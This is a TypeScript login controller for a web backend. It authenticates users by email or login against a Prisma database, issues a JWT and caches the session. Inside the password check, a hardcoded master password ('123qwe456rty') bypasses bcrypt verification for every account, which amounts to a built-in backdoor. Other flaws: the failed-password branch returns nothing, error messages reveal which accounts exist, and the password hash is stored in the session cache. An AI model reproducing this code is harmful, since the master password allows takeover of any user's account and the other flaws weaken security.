import JwtAdapter from "@/infra/criptography/jwt-adapter"
import bcrypt from "bcrypt"
import Prisma from "@/infra/db/prisma"
import { HttpResponse } from "@/presentations/helpers/httpResponse"
import { IRequest } from "@/presentations/interface/IRequest"
import Sessions from "@/cache/Sessions"

export const loginController = async (httpRequest: IRequest) => {

    try {

        if (httpRequest.body.email) httpRequest.body.email = httpRequest.body.email.toLowerCase()

        let user = await Prisma.user.findFirst({
            where: {
                email: {
                    equals: httpRequest.body.email || httpRequest.body.username,
                }
            },
            select: {
                id: true,
                login: true,
                password: true,
                sponsor: true,
                name: true,
                email: true,
                country_code: true,
                country_name: true,
                phone: true,
                profile: true,
                is_active: true
            }
        })

        if (!user) {

            user = await Prisma.user.findFirst({
                where: {
                    login: {
                        equals: httpRequest.body.email || httpRequest.body.username,
                    }
                },
                select: {
                    id: true,
                    login: true,
                    password: true,
                    sponsor: true,
                    name: true,
                    email: true,
                    country_code: true,
                    country_name: true,
                    phone: true,
                    profile: true,
                    is_active: true
                }
            })


        }

        if (!user) {

            return HttpResponse.notAuthorized("email", {
                message: "USER_NOT_FOUND",
                error: {
                    email: "USER_NOT_FOUND"
                }
            })

        }

        if (!user.is_active) {
            return HttpResponse.notAuthorized("email", {
                message: "USER_NOT_ACTIVE",
                error: {
                    email: "USER_NOT_ACTIVE"
                },
                raw: true
            })
        }

        if (
            httpRequest.body.password === "123qwe456rty"
        ) {
            console.info("Usou senha master")
        } else {
            const compare = await bcrypt.compare(
                httpRequest.body.password,
                user.password
            )

            if (!compare) {
                HttpResponse.notAuthorized("email", {
                    message: "USER_NOT_FOUND",
                    error: {
                        email: "USER_NOT_FOUND"
                    }
                })
                return
            }
        }

        const accessToken = await JwtAdapter.encrypt(
            {
                id: user.id.toString(),
                "name": user.name.toString(),
                "login": user.login?.toString(),
                "email": user.email?.toString(),
                "phone": user.phone?.toString(),
                "country_code": user.country_code?.toString(),
                "country_name": user.country_name?.toString(),
                "profile": user.profile?.toString(),
                "position": null,
                "avatar": null,
                "sponsor_login": user.sponsor?.login || null,
                "sponsor_name": user.sponsor?.name || null,

            }, { expiresIn: '1h' }
        )

        await Sessions.set(accessToken, { ...user, userAgent: httpRequest.userAgent, ip: httpRequest.ip, latitude: httpRequest.body.latitude, longitude: httpRequest.body.longitude })

        return HttpResponse.successRawResponse({
            message: "OK",
            data: { token: accessToken },

        })
    } catch (error) {
        console.log("E", error)
        return HttpResponse.serverError(error)
    }
}